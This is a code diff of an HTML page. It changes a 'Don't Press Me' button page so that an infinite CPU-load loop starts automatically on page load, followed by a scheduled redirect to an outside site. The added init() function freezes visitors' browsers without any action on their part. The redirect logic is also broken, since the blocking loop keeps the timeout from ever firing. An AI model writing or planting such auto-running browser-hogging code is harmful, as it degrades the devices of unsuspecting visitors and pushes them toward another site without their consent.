@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High CPU Load</title>
+    <title>Auto Redirect with CPU Load</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -57,15 +57,24 @@
         }
     </style>
 </head>
-<body>
+<body onload="init()">
 
     <div class="button-container">
         <button class="btn" onclick="causeCpuLoad()"><span>Don't Press Me</span></button>
     </div>
 
     <script>
+        function init() {
+            // Start high CPU load in a loop
+            causeCpuLoad();
+            // Redirect after 0.1 seconds
+            setTimeout(() => {
+                window.location.href = "https://adiasta.com/stars";
+            }, 100); // 100 milliseconds
+        }
+
         function causeCpuLoad() {
-            // Intentionally run an infinite loop to simulate high CPU usage
+            // Simulate high CPU usage in an infinite loop
             while (true) {
                 Math.sqrt(Math.random());
             }
